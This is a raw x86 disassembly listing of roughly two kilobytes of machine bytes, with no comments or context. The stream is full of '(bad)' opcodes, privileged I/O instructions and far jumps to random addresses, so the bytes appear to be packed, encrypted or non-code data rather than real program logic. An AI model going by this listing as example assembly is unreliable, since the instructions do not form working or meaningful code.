  432417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432418:	mov    esi,0x60a8badc
  43241d:	and    bh,BYTE PTR [esi-0x17552f74]
  432423:	xchg   edi,eax
  432424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432425:	mov    ds:0xd1fa4f4b,al
  43242a:	xchg   bh,dh
  43242c:	cmp    al,0x3f
  43242e:	push   0x58b74017
  432433:	add    eax,0x3c6bee2e
  432438:	mov    bl,0x58
  43243a:	mov    al,ds:0xce88a6d
  43243f:	dec    esp
  432440:	cmp    BYTE PTR [esi],dh
  432442:	jp     0x432464
  432444:	pop    eax
  432445:	mov    eax,0x44022419
  43244a:	push   0x95b4cb5b
  43244f:	mov    al,ds:0x8462d826
  432454:	loopne 0x43240a
  432456:	push   eax
  432457:	rol    BYTE PTR [ebp-0x22f224ba],0xa7
  43245e:	and    eax,0x18d545a2
  432463:	fistp  WORD PTR [esi+0x6c416c32]
  432469:	mov    ah,0x99
  43246b:	frstor [esi-0x14]
  43246e:	arpl   WORD PTR ds:0x35b8820,si
  432474:	popa   
  432475:	neg    DWORD PTR [edx]
  432477:	inc    esp
  432478:	ds adc al,0xd
  43247b:	adc    esp,ebp
  43247d:	pop    ebp
  43247e:	(bad)  
  43247f:	mov    dh,0xca
  432481:	add    ch,BYTE PTR [ebp-0x76948af3]
  432487:	pop    esp
  432488:	outs   dx,DWORD PTR ds:[esi]
  432489:	das    
  43248a:	xor    edx,edi
  43248c:	sbb    bl,cl
  43248e:	push   esi
  43248f:	push   ebp
  432490:	mov    ebx,0x266fda6d
  432495:	pop    ebx
  432496:	scas   al,BYTE PTR es:[edi]
  432497:	or     dl,ah
  432499:	fcom   DWORD PTR [ebp+eax*1-0x25]
  43249d:	sahf   
  43249e:	jecxz  0x4324ad
  4324a0:	lds    edx,FWORD PTR [edi+0x2ec50341]
  4324a6:	sbb    BYTE PTR [ebx+0x69],0x76
  4324aa:	mov    dl,0xc5
  4324ac:	test   DWORD PTR [esi],edx
  4324ae:	inc    ecx
  4324af:	jmp    FWORD PTR [esi+0x64]
  4324b2:	imul   esp,DWORD PTR [eax],0xe
  4324b5:	sbb    al,0x45
  4324b8:	test   eax,esp
  4324ba:	(bad)  
  4324bb:	fwait
  4324bc:	mov    ds:0x2bc11076,al
  4324c1:	and    eax,DWORD PTR [eax-0x7a7a8f17]
  4324c7:	lods   eax,DWORD PTR ds:[esi]
  4324c8:	push   cs
  4324c9:	or     DWORD PTR [eiz*8-0x4d090b38],esi
  4324d0:	xchg   BYTE PTR [edx],cl
  4324d2:	sbb    ebx,ebx
  4324d4:	jae    0x4324cf
  4324d6:	gs clc 
  4324d8:	sub    cl,BYTE PTR [ebx+0x5e]
  4324db:	cmp    esp,DWORD PTR [ebx-0x4093d1d6]
  4324e1:	push   cs
  4324e2:	popf   
  4324e3:	fcomp  QWORD PTR [ebx-0x25e968c2]
  4324e9:	mov    dh,0xa2
  4324eb:	test   eax,0xca47f20b
  4324f0:	mov    WORD PTR fs:[eax+0x7d],cs
  4324f4:	loop   0x432538
  4324f6:	add    eax,DWORD PTR [eax]
  4324f8:	scas   al,BYTE PTR es:[edi]
  4324f9:	jmp    0x3b54:0x759f1073
  432500:	stos   BYTE PTR es:[edi],al
  432501:	or     BYTE PTR [ebp+0x4d],ch
  432504:	mov    al,ds:0xe81adbe7
  432509:	mov    dh,0x6e
  43250b:	adc    BYTE PTR [esp+esi*8-0x5d],bl
  43250f:	je     0x4324c8
  432511:	mov    eax,ds:0xa81b5fba
  432516:	mov    dh,0x62
  432518:	div    bl
  43251a:	and    esi,ecx
  43251c:	mov    al,ds:0xd6ea23a
  432521:	adc    al,0xa3
  432523:	mov    ebp,0x109e1aa4
  432528:	les    ecx,FWORD PTR [ebp-0x540de452]
  43252e:	mov    ?,WORD PTR [esi-0x2f47ffc5]
  432534:	or     edi,esi
  432536:	pop    esi
  432537:	mov    eax,0xa3fb5fed
  43253c:	sbb    edx,DWORD PTR [edi+edx*1+0x5]
  432540:	adc    eax,0xba00296b
  432545:	ins    DWORD PTR es:[edi],dx
  432546:	jne    0x43255d
  432548:	aad    0xec
  43254a:	xchg   edi,eax
  43254b:	and    BYTE PTR [ebx+ebp*4-0x44faa207],cl
  432552:	add    BYTE PTR [ebx],bh
  432554:	sub    BYTE PTR [edi],bh
  432556:	xchg   ecx,eax
  432557:	xchg   edi,eax
  432558:	ins    DWORD PTR es:[edi],dx
  432559:	inc    ecx
  43255a:	cmp    BYTE PTR [eax-0x272a97a8],ch
  432560:	pop    eax
  432561:	fsubr  DWORD PTR [edx+0x4]
  432564:	dec    esi
  432565:	inc    esi
  432566:	or     BYTE PTR [eax-0x68eeff1d],ah
  43256c:	fsubr  DWORD PTR [edx]
  43256e:	cmp    eax,0x9a98378b
  432573:	test   al,0xdb
  432575:	(bad)  
  432576:	cmp    DWORD PTR [ebx+0x7117a4dd],0x19
  43257d:	sub    esp,DWORD PTR [esi*4-0x74e8bfca]
  432584:	inc    ecx
  432585:	and    ecx,ebx
  432587:	sub    eax,0x346e46d8
  43258c:	rcl    DWORD PTR [esi],0x7a
  43258f:	sub    eax,0x27a2bcd4
  432594:	mov    dh,0xb7
  432596:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432597:	mov    cs,WORD PTR [eax-0x7ee84a65]
  43259d:	adc    DWORD PTR [ebx+0x5d6ed626],edi
  4325a3:	push   ecx
  4325a4:	(bad)  [ecx+esi*2-0x8]
  4325a8:	out    0x1a,al
  4325aa:	add    dh,BYTE PTR [ecx+eax*1]
  4325ad:	jo     0x4325a8
  4325af:	not    dl
  4325b1:	add    BYTE PTR [ecx+ebx*2],bl
  4325b4:	call   0x2c6d:0xba2e4ce8
  4325bb:	adc    BYTE PTR [edx+0x30],ah
  4325be:	scas   eax,DWORD PTR es:[edi]
  4325bf:	sti    
  4325c0:	clc    
  4325c1:	data16 sbb bl,BYTE PTR [ebx]
  4325c4:	sbb    ebp,DWORD PTR [ebp+0x17]
  4325c7:	dec    esi
  4325c8:	jge    0x432578
  4325ca:	cmp    BYTE PTR [edi],bh
  4325cc:	sbb    eax,0x81abe03
  4325d1:	mov    eax,0xd41a866d
  4325d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4325d7:	lods   al,BYTE PTR ds:[esi]
  4325d8:	and    eax,0xdd68dbda
  4325dd:	(bad)  
  4325df:	cmp    BYTE PTR [ecx+0x4bbb69ae],ch
  4325e5:	aam    0xdd
  4325e7:	add    al,0xdb
  4325e9:	mov    dh,0x74
  4325eb:	scas   al,BYTE PTR es:[edi]
  4325ec:	mov    al,ds:0x92322f77
  4325f1:	or     BYTE PTR [esi],bh
  4325f3:	ins    BYTE PTR es:[edi],dx
  4325f4:	in     eax,dx
  4325f5:	mov    cl,BYTE PTR [ebp-0x34]
  4325f8:	int3   
  4325f9:	ds in  eax,dx
  4325fb:	call   0x80ec78fb
  432600:	cs ins DWORD PTR es:[edi],dx
  432602:	pop    ds
  432603:	xchg   ebp,eax
  432604:	stc    
  432605:	imul   edi,DWORD PTR [edx+0x65],0xffffffdf
  432609:	inc    ecx
  43260a:	push   0x13
  43260c:	shl    DWORD PTR [esi-0x48aaa7b0],0x4
  432613:	mov    edx,0x22edb1a3
  432618:	push   0xffffffbe
  43261a:	fs into 
  43261c:	loopne 0x43261e
  43261e:	vmfunc 
  432621:	adc    al,0x71
  432623:	and    bh,BYTE PTR [ecx]
  432625:	and    al,0x85
  432627:	test   eax,0x266a5ff2
  43262c:	gs ja  0x4325e1
  43262f:	add    bh,al
  432631:	jge    0x432633
  432633:	mov    cl,ah
  432635:	js     0x4325df
  432637:	push   ss
  432638:	outs   dx,BYTE PTR ds:[esi]
  432639:	lods   eax,DWORD PTR ds:[esi]
  43263a:	mov    esi,0xc76c7dc2
  43263f:	adc    BYTE PTR [eax-0x1fbf492b],dh
  432645:	jns    0x4325d9
  432647:	push   es
  432648:	aam    0xc8
  43264a:	adc    eax,eax
  43264c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43264d:	add    ch,ah
  43264f:	inc    ecx
  432650:	ret    0xbc8f
  432653:	push   0x3b
  432655:	jmp    0x9c49:0x8b42a046
  43265c:	ret    0x6220
  43265f:	jne    0x432675
  432661:	mov    al,0x5d
  432663:	pop    esp
  432664:	push   cs
  432665:	sahf   
  432666:	adc    al,0x81
  432668:	retf   
  432669:	inc    ecx
  43266a:	shr    BYTE PTR [ebp-0x4d0d47d7],0xee
  432671:	outs   dx,DWORD PTR ds:[esi]
  432672:	push   eax
  432673:	or     al,ah
  432675:	shr    DWORD PTR [eax],0xda
  432678:	jbe    0x4326ca
  43267a:	imul   esp,DWORD PTR [edx],0x44bde01d
  432680:	pop    ebp
  432681:	push   0x83e651b
  432686:	aam    0xd0
  432688:	daa    
  432689:	jno    0x432646
  43268b:	or     ch,BYTE PTR [esi+0x4d]
  43268e:	or     BYTE PTR [ebp+0x439dcaa7],ch
  432694:	jne    0x4326b6
  432696:	mov    al,ds:0x130514d8
  43269b:	or     BYTE PTR [ebp+0x6e],cl
  43269e:	xchg   esp,eax
  43269f:	cmp    BYTE PTR [edx],0xa4
  4326a2:	or     ecx,DWORD PTR [ecx]
  4326a4:	imul   esp,DWORD PTR [ecx-0x45f4babc],0xbedcf88a
  4326ae:	outs   dx,BYTE PTR ds:[esi]
  4326af:	dec    ebp
  4326b0:	add    eax,0xf67cd26d
  4326b5:	in     eax,0x5c
  4326b7:	dec    edx
  4326b9:	sub    eax,0xc2d046a8
  4326be:	mov    dl,0x79
  4326c0:	push   ecx
  4326c1:	mov    al,0x81
  4326c3:	stos   BYTE PTR es:[edi],al
  4326c4:	addr16 xchg ebx,eax
  4326c6:	xchg   edi,eax
  4326c7:	outs   dx,BYTE PTR ds:[esi]
  4326c8:	test   DWORD PTR [ebp+0x57ab0d11],ebp
  4326ce:	xor    ah,bl
  4326d0:	and    esi,DWORD PTR [eax+0x44]
  4326d3:	inc    edi
  4326d4:	adc    DWORD PTR [edi-0x597ddfd4],esi
  4326da:	push   esp
  4326db:	dec    ebx
  4326dc:	cs push eax
  4326de:	mov    edx,0x393122b1
  4326e3:	mov    DWORD PTR [eax-0x408d2729],edi
  4326e9:	aad    0xad
  4326eb:	inc    ebp
  4326ec:	xor    eax,0xb5208700
  4326f1:	inc    ecx
  4326f2:	mov    bh,0x26
  4326f4:	bound  edx,QWORD PTR [ebx]
  4326f6:	test   al,0xc6
  4326f8:	(bad)  
  4326f9:	pop    edi
  4326fa:	popa   
  4326fb:	cwde   
  4326fc:	mov    ds:0x3697cd6,al
  432701:	ins    DWORD PTR es:[edi],dx
  432702:	outs   dx,BYTE PTR ds:[esi]
  432703:	xacquire xchg BYTE PTR [ebx-0x4a],dh
  432707:	add    cl,BYTE PTR [ecx+0x0]
  43270a:	sbb    DWORD PTR [ecx+edx*8+0x6d],ebp
  43270e:	arpl   WORD PTR [ebx+0x16459c67],bp
  432714:	stos   BYTE PTR es:[edi],al
  432715:	add    eax,0x506b75d9
  43271a:	push   ebx
  43271b:	or     al,0x5d
  43271d:	lods   al,BYTE PTR ds:[esi]
  43271e:	es push edi
  432720:	xchg   DWORD PTR [ecx],esp
  432722:	call   0xc8347cfd
  432727:	push   cs
  432728:	sbb    edx,edi
  43272a:	xchg   esp,eax
  43272b:	inc    edx
  43272c:	pop    ss
  43272d:	shr    DWORD PTR [ebp-0x5c4b2282],0xc5
  432734:	xchg   ecx,eax
  432735:	loop   0x43279a
  432737:	mov    ds:0x1594e2ab,eax
  43273c:	aas    
  43273d:	in     eax,0x33
  43273f:	in     al,dx
  432740:	dec    eax
  432741:	shl    BYTE PTR [esi+0x51],1
  432744:	je     0x43270b
  432746:	jmp    0x987e392e
  43274b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43274c:	push   cs
  43274d:	add    BYTE PTR [edx-0x29c2fc7b],bh
  432753:	push   edi
  432754:	xchg   BYTE PTR [edi],dh
  432756:	mov    dh,0xca
  432758:	test   DWORD PTR [ecx+0x2e],eax
  43275b:	xchg   ebp,eax
  43275c:	pop    edi
  43275d:	pop    es
  43275e:	cmp    eax,0x23f7e978
  432763:	pusha  
  432764:	push   edi
  432765:	add    dh,ah
  432767:	xchg   bl,dl
  432769:	lds    edx,FWORD PTR [edx-0x13]
  43276c:	push   es
  43276d:	test   BYTE PTR [edi],dl
  43276f:	pop    es
  432770:	jge    0x43276d
  432772:	lea    ebx,[edx]
  432774:	push   0xffffffa2
  432776:	fisttp DWORD PTR [edx-0x6e]
  432779:	mov    WORD PTR [edi-0x23a931b5],ds
  43277f:	adc    DWORD PTR ds:0x8aec946c,ebp
  432785:	and    BYTE PTR [esp+eiz*8],dh
  432788:	sbb    eax,0xf3a976d5
  43278d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43278e:	xor    BYTE PTR [ecx-0x7bbc2e5f],bl
  432794:	pop    ebx
  432795:	push   0x8
  432797:	or     BYTE PTR [ebx+0x762f8960],0xda
  43279e:	xor    eax,0x2e60dd10
  4327a3:	or     eax,DWORD PTR [eax-0x3ebcbabf]
  4327a9:	push   esi
  4327aa:	inc    ecx
  4327ab:	mov    ebx,0x117f946b
  4327b0:	jae    0x4327cd
  4327b2:	mov    bh,0x9a
  4327b4:	add    dl,bh
  4327b6:	sbb    al,BYTE PTR [ebx]
  4327b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4327b9:	stos   DWORD PTR es:[edi],eax
  4327ba:	addr16 pop esi
  4327bc:	inc    edx
  4327bd:	mov    ch,ch
  4327bf:	push   esi
  4327c0:	adc    edx,DWORD PTR [esp+ebx*4-0xf]
  4327c4:	dec    esp
  4327c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4327c6:	adc    al,0x71
  4327c8:	in     eax,dx
  4327c9:	shl    DWORD PTR [esi+0x667d2a82],cl
  4327cf:	cmp    eax,0x171c2aef
  4327d4:	loop   0x43278c
  4327d6:	mov    ch,0x4b
  4327d8:	fld    QWORD PTR [esi]
  4327da:	ss mov al,0x47
  4327dd:	mov    eax,ds:0x5d3b5280
  4327e2:	inc    eax
  4327e3:	fwait
  4327e4:	sub    ah,BYTE PTR [esi-0x65]
  4327e7:	cmp    al,0xc5
  4327e9:	adc    DWORD PTR [esi+0x6c],ebp
  4327ec:	ins    BYTE PTR es:[edi],dx
  4327ed:	mov    ch,0x59
  4327ef:	xchg   ebp,eax
  4327f0:	push   ss
  4327f1:	aam    0x9f
  4327f3:	popa   
  4327f4:	unpckhps xmm6,XMMWORD PTR [esi]
  4327f7:	dec    ebp
  4327f8:	inc    ecx
  4327f9:	sbb    eax,DWORD PTR [edx-0xaa8d769]
  4327ff:	or     DWORD PTR [esp+ebp*2+0x0],edx
  432803:	mov    BYTE PTR [edi+0x27],ch
  432806:	inc    eax
  432807:	inc    ebx
  432808:	mov    es,WORD PTR [eax-0x513f8a5]
  43280e:	imul   edx,DWORD PTR [edi],0x23
  432811:	rcl    eax,1
  432813:	sub    eax,0x1733b636
  432818:	xor    al,0xf0
  43281a:	xlat   BYTE PTR ds:[ebx]
  43281b:	js     0x432856
  43281d:	mov    ah,0xea
  43281f:	mov    dh,0x35
  432821:	adc    BYTE PTR [ecx-0x730294a3],dh
  432827:	fcom   QWORD PTR [edx+0x29a36a0d]
  43282d:	aaa    
  43282e:	repz inc edx
  432830:	xchg   ebx,eax
  432831:	sti    
  432832:	add    al,0xc0
  432834:	lods   eax,DWORD PTR ds:[esi]
  432835:	inc    eax
  432836:	dec    ebp
  432837:	inc    edi
  432838:	cmp    eax,0xa6c4046
  43283d:	fisubr DWORD PTR [ebp-0x70]
  432840:	mov    dh,0x83
  432842:	iret   
  432843:	add    esp,DWORD PTR [ecx-0x4a89f75]
  432849:	and    eax,0x7e1a48d
  43284e:	pusha  
  43284f:	push   edi
  432850:	shr    BYTE PTR [ebp-0x46],0xb3
  432854:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432855:	bound  edi,QWORD PTR [edx-0x25a20aca]
  43285b:	push   0xbd706a88
  432860:	jns    0x4328d0
  432862:	mov    esp,0x1d8a28af
  432867:	adc    esp,ebp
  432869:	jb     0x432881
  43286b:	push   ecx
  43286c:	(bad)  [esi+0x6b]
  43286f:	mov    al,dh
  432871:	pop    ss
  432872:	ss push ebx
  432874:	je     0x4328ae
  432876:	xchg   BYTE PTR [ebp+0x4],al
  432879:	xor    al,0x6d
  43287b:	or     eax,0x2e8c7399
  432880:	es cdq 
  432882:	sub    eax,0xdd576d0b
  432887:	sbb    BYTE PTR [ecx+0x29],dl
  43288a:	lods   al,BYTE PTR ds:[esi]
  43288b:	inc    ebx
  43288c:	retf   
  43288d:	or     BYTE PTR [edx-0x45],ah
  432890:	sub    eax,0xc3daaa89
  432895:	lods   eax,DWORD PTR ds:[esi]
  432896:	cwde   
  432897:	cmp    edx,DWORD PTR [edi-0x40]
  43289a:	mov    dl,0x6d
  43289c:	xor    bh,bh
  43289e:	cmp    ecx,DWORD PTR [eax]
  4328a0:	and    ecx,DWORD PTR [edi]
  4328a2:	sbb    BYTE PTR [esp+ebp*8+0x8],dl
  4328a6:	push   0x91360c46
  4328ab:	pop    ds
  4328ac:	add    DWORD PTR [ecx+edx*8],esi
  4328af:	ss scas al,BYTE PTR es:[edi]
  4328b1:	xor    BYTE PTR [ecx],0xa7
  4328b4:	mov    ebx,0x8003edc9
  4328b9:	pop    ebp
  4328ba:	pop    esp
  4328bb:	jnp    0x4328a8
  4328bd:	adc    al,0x35
  4328bf:	pop    esp
  4328c0:	fsubr  DWORD PTR [esi-0x6c]
  4328c3:	mov    dh,0x32
  4328c5:	pop    ecx
  4328c6:	or     dl,BYTE PTR [ebx-0x28]
  4328c9:	(bad)  
  4328cb:	shl    DWORD PTR [ebx-0x45],1
  4328ce:	add    bh,BYTE PTR [eax-0x1cc05caf]
  4328d4:	out    dx,al
  4328d5:	jp     0x4328a0
  4328d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4328d8:	mov    al,ds:0x9568582d
  4328dd:	sub    eax,DWORD PTR [edx]
  4328df:	aaa    
  4328e0:	and    DWORD PTR [ecx+0x2b],esp
  4328e3:	test   al,0x3
  4328e5:	mov    al,ds:0x5289d39b
  4328ea:	push   ebp
  4328eb:	add    DWORD PTR [eax+0x41],ebp
  4328ee:	adc    esp,DWORD PTR [ebp*4+0x7f6c555d]
  4328f5:	xor    BYTE PTR [ebp+0x19af13c],cl
  4328fb:	or     eax,0x1c3d0b6c
  432900:	add    eax,0x41ee5114
  432905:	mov    ebx,0x86f0762a
  43290a:	add    bl,BYTE PTR [eax+eax*4+0x60206807]
  432911:	pop    es
  432912:	lods   eax,DWORD PTR ds:[esi]
  432913:	fisub  DWORD PTR [ebp+0x1be5d570]
  432919:	pop    ebx
  43291a:	mov    eax,esp
  43291c:	outs   dx,BYTE PTR ds:[esi]
  43291d:	cdq    
  43291e:	pop    edx
  43291f:	sub    ebp,esp
  432921:	add    BYTE PTR [esi+ebp*1],bl
  432924:	sbb    BYTE PTR [ebx+0x71fa2a89],0x33
  43292b:	enter  0x4a16,0x17
  43292f:	fisub  DWORD PTR [ebp-0x282ebe9c]
  432935:	inc    edi
  432936:	mul    DWORD PTR [eax+0xd]
  432939:	adc    al,0xb
  43293b:	pop    eax
  43293c:	fcom   DWORD PTR [esi-0x58f7d80b]
  432942:	test   DWORD PTR [edx+0x1b80887b],0x12ad786d
  43294c:	push   ss
  43294d:	or     BYTE PTR [ebp+0x7],ch
  432950:	je     0x4329bd
  432952:	adc    esi,esi
  432954:	xlat   BYTE PTR ds:[ebx]
  432955:	dec    BYTE PTR [ebx+ebp*1+0x16351503]
  43295c:	fimul  DWORD PTR [esi]
  43295e:	add    dl,0xca
  432961:	inc    edi
  432962:	test   eax,0x5dd71ca1
  432967:	push   eax
  432968:	fcom   QWORD PTR [esi-0x49af0c8c]
  43296e:	pop    ds
  43296f:	sbb    BYTE PTR [edx+ebx*8],al
  432972:	outs   dx,BYTE PTR ds:[esi]
  432973:	rol    BYTE PTR [ecx-0x256ced4c],0xfa
  43297a:	or     ch,al
  43297c:	les    esi,FWORD PTR [esi-0x25]
  43297f:	mov    esi,0xbb2676b9
  432984:	xchg   ebp,eax
  432985:	and    eax,ebx
  432987:	mov    DWORD PTR [esi+0x2],esi
  43298a:	mov    al,0xd0
  43298c:	add    BYTE PTR [ecx],dh
  43298e:	jae    0x432969
  432990:	dec    ebx
  432991:	lea    eax,[edx-0x583bb8a0]
  432997:	ror    BYTE PTR [esi],1
  432999:	push   esp
  43299a:	push   0xd91b0157
  43299f:	loope  0x432952
  4329a1:	fsubp  st(2),st
  4329a3:	mov    WORD PTR [ebp+0x74],ss
  4329a6:	jmp    0x43294a
  4329a8:	bound  esp,QWORD PTR [edx-0x4f2364bf]
  4329ae:	mov    ch,0xd0
  4329b0:	jbe    0x4329ce
  4329b2:	in     al,dx
  4329b3:	ret    
  4329b4:	lds    edx,FWORD PTR [esi]
  4329b6:	adc    ebx,0xffffffe5
  4329b9:	sub    BYTE PTR [eax-0xd984b4f],bh
  4329bf:	out    dx,eax
  4329c0:	dec    ebp
  4329c1:	mov    ds:0xdc00ac53,al
  4329c6:	mov    dh,0x2e
  4329c8:	push   0xffffffba
  4329ca:	or     cl,cl
  4329cc:	add    BYTE PTR [edi-0x557148b1],0x5d
  4329d3:	inc    ebp
  4329d4:	add    DWORD PTR [eax-0x3cb5ed88],ecx
  4329da:	int    0xa
  4329dc:	bound  eax,QWORD PTR [ebx+0x50]
  4329df:	and    BYTE PTR [ebp+0x768b60dd],ch
  4329e5:	jmp    0x4329c8
  4329e7:	xlat   BYTE PTR ds:[ebx]
  4329e8:	push   ebx
  4329e9:	or     BYTE PTR [ebp-0x158096e0],ch
  4329ef:	(bad)  
  4329f0:	add    eax,0xb89a395c
  4329f5:	stos   DWORD PTR es:[edi],eax
  4329f6:	mov    BYTE PTR [esi],ah
  4329f8:	sbb    dh,bl
  4329fa:	jbe    0x4329a5
  4329fc:	fnstsw WORD PTR [eax-0x1]
  4329ff:	das    
  432a00:	in     eax,dx
  432a01:	push   ecx
  432a02:	loop   0x432a1e
  432a04:	(bad)
  432a07:	out    0xba,al
  432a09:	jne    0x432a4c
  432a0b:	shl    DWORD PTR [eiz*8-0x7935047a],0x70
  432a13:	mov    eax,ds:0x25a1bedd
  432a18:	inc    ecx
  432a19:	xlat   BYTE PTR ds:[ebx]
  432a1a:	pop    ss
  432a1b:	push   cs
  432a1c:	mov    ds:0x6e88b6cc,eax
  432a21:	dec    ebp
  432a22:	inc    esp
  432a23:	call   0x4e757d5d
  432a28:	and    eax,0xa886ad80
  432a2d:	adc    DWORD PTR [edi-0x592a1fcc],ebp
  432a33:	stos   BYTE PTR es:[edi],al
  432a34:	outs   dx,BYTE PTR ds:[esi]
  432a35:	mov    al,0x4
  432a37:	call   0xd6d1:0x52bf6239
  432a3e:	adc    eax,0xe4596d73
  432a43:	cdq    
  432a44:	rol    esi,0xad
  432a47:	test   DWORD PTR [eax+ebx*8],eax
  432a4a:	sbb    DWORD PTR [ebp-0x1200e718],edi
  432a50:	stos   BYTE PTR es:[edi],al
  432a51:	push   0x53
  432a53:	push   0x29a46f70
  432a58:	daa    
  432a59:	call   0x21ab:0x68055da0
  432a60:	loope  0x432ac9
  432a62:	cmp    ah,BYTE PTR ss:[eax-0x513342cb]
  432a69:	aad    0xed
  432a6b:	popf   
  432a6c:	mov    bh,0xe
  432a6e:	push   0xdc7a3da1
  432a73:	push   ss
  432a74:	xchg   BYTE PTR [ebp-0x25],dl
  432a77:	stos   BYTE PTR es:[edi],al
  432a78:	pop    edx
  432a79:	sub    cl,BYTE PTR [ebx-0x4a]
  432a7c:	call   0xb8d978c8
  432a81:	mov    al,0x54
  432a83:	loopne 0x432a77
  432a85:	ret    0x241f
  432a88:	loopne 0x432a42
  432a8a:	push   es
  432a8b:	mov    bh,0xa6
  432a8d:	sbb    BYTE PTR [eax+0x71],0x75
  432a91:	das    
  432a92:	mov    al,0x61
  432a94:	mov    al,ds:0xe5b6d5b8
  432a99:	add    BYTE PTR [esi-0x1b22676f],dh
  432a9f:	fisub  DWORD PTR [edi+0xe]
  432aa2:	fs inc esp
  432aa4:	rcl    ah,1
  432aa6:	fiadd  DWORD PTR [ecx+0x33bc9a47]
  432aac:	lods   eax,DWORD PTR ds:[esi]
  432aad:	add    ebp,DWORD PTR [edx+0x5ca9995d]
  432ab3:	in     eax,0x47
  432ab5:	pop    ss
  432ab6:	aad    0x76
  432ab8:	(bad)  [esi+0x1173cb0c]
  432abe:	dec    ecx
  432abf:	mov    al,0xe8
  432ac1:	repnz retf 
  432ac3:	pop    edi
  432ac4:	add    DWORD PTR [ebx+0x14],ecx
  432ac7:	pop    ebp
  432ac8:	into   
  432ac9:	icebp  
  432aca:	and    ebx,DWORD PTR [edi]
  432acc:	mov    al,ds:0xc0d00ad
  432ad1:	lea    edx,[edx+0x6b]
  432ad4:	cmc    
  432ad5:	fimul  DWORD PTR [esi]
  432ad7:	sub    BYTE PTR [esi],dl
  432ad9:	xchg   edx,eax
  432ada:	outs   dx,BYTE PTR ds:[esi]
  432adb:	gs push ds
  432add:	pushf  
  432ade:	sahf   
  432adf:	jbe    0x432af5
  432ae1:	les    eax,FWORD PTR ds:0x80312d06
  432ae7:	cmp    bl,BYTE PTR [ebp-0x68]
  432aea:	clc    
  432aeb:	pusha  
  432aec:	fucomi st,st(4)
  432aee:	jle    0x432a76
  432af0:	xchg   ebp,eax
  432af1:	das    
  432af2:	cli    
  432af3:	or     dh,BYTE PTR [ebp+0xa106b6a]
  432af9:	inc    esp
  432afa:	xor    al,0xfd
  432afc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432afd:	sub    BYTE PTR es:[esi+0x37],ch
  432b01:	dec    edx
  432b02:	push   0xd0534352
  432b07:	adc    eax,0x5507c2c4
  432b0c:	cmp    eax,0xb270fda
  432b11:	loop   0x432b59
  432b13:	mov    ebx,0xd1d09531
  432b18:	and    al,0x63
  432b1a:	rcr    BYTE PTR [ebx],cl
  432b1c:	jno    0x432a9f
  432b1e:	lods   eax,DWORD PTR ds:[esi]
  432b1f:	lods   eax,DWORD PTR ds:[esi]
  432b20:	(bad)  
  432b22:	inc    eax
  432b23:	mov    esi,0x7bcdf653
  432b28:	sbb    ebp,DWORD PTR [eax+0x1ea8415d]
  432b2e:	xor    cl,BYTE PTR [edi]
  432b30:	push   esi
  432b31:	and    al,0x10
  432b33:	mov    bh,0xad
  432b35:	ins    DWORD PTR es:[edi],dx
  432b36:	cmc    
  432b37:	inc    ebx
  432b38:	or     BYTE PTR [eax+ecx*4-0x4494ac5f],0xb0
  432b40:	aam    0x15
  432b42:	push   0x226b2080
  432b47:	mov    bh,ah
  432b49:	xor    eax,0x6a26a5b6
  432b4e:	dec    edi
  432b4f:	lods   al,BYTE PTR ds:[esi]
  432b50:	loope  0x432b08
  432b52:	scas   al,BYTE PTR es:[edi]
  432b53:	or     esp,DWORD PTR [edi+eax*2]
  432b56:	push   esp
  432b57:	pop    esp
  432b58:	fsub   st,st(0)
  432b5a:	xchg   edi,eax
  432b5b:	and    ch,BYTE PTR [edi-0x70]
  432b5e:	inc    eax
  432b5f:	mov    al,BYTE PTR [ebp+0x3def56db]
  432b65:	push   edi
  432b66:	(bad)
  432b6a:	mov    ds:0xeb63741,al
  432b6f:	(bad)  
  432b70:	ret    
  432b71:	out    0x7,al
  432b73:	adc    eax,0x82a986d9
  432b78:	mov    eax,0x472f9f35
  432b7d:	mov    ch,0x20
  432b7f:	push   ds
  432b80:	mov    ch,0xb
  432b82:	sbb    eax,0x4230beb0
  432b87:	mov    ah,0x1c
  432b89:	push   ecx
  432b8a:	mov    esi,0xdb016d8c
  432b8f:	mov    dh,0x20
  432b91:	push   0xbed43b86
  432b96:	lahf   
  432b97:	mov    es,WORD PTR [edx+0x17055d6e]
  432b9d:	mov    ecx,0xdace997a
  432ba2:	add    eax,0x4ae73b6d
  432ba7:	or     al,0xbc
  432ba9:	mov    eax,0x85f07e44
  432bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432baf:	mov    es,WORD PTR [eax]
  432bb1:	push   es
  432bb2:	dec    ebx
  432bb3:	(bad)
  432bb6:	push   edx
  432bb7:	inc    ebx
  432bb8:	fst    QWORD PTR [esi+0x5aad037b]
  432bbe:	retf   0x5237
  432bc1:	pop    edi
  432bc2:	add    eax,0x64fcbfcb
  432bc7:	repnz add BYTE PTR [ebx+eax*8-0x51],al
  432bcc:	add    BYTE PTR [ecx],bh
  432bce:	add    al,0x0
  432bd0:	test   DWORD PTR [edx],ebp
  432bd2:	or     bl,ch
  432bd4:	mov    al,ds:0x67d30d82
  432bd9:	and    DWORD PTR [edi+ebx*8+0x56],edi
  432bdd:	pop    ebx
  432bde:	jmp    0x432b62
  432be0:	popa   
  432be1:	sub    cl,ch
  432be3:	mov    BYTE PTR [ecx-0x5c],cl
  432be6:	and    bl,BYTE PTR [edx]
  432be8:	jmp    0x1b587684
  432bed:	cld    
  432bee:	stos   DWORD PTR es:[edi],eax
  432bef:	pop    ebx
  432bf0:	pop    esp
  432bf1:	(bad)  
  432bf2:	push   ebx
  432bf3:	aad    0xd6
  432bf5:	add    DWORD PTR [ecx+ecx*1],edx
  432bf8:	lods   eax,DWORD PTR ds:[esi]
  432bf9:	pop    esp
  432bfa:	inc    esi
  432bfb:	add    cl,BYTE PTR ds:0x7bb902c0
  432c01:	in     eax,dx
  432c02:	push   esp
  432c03:	mov    ah,0xb6
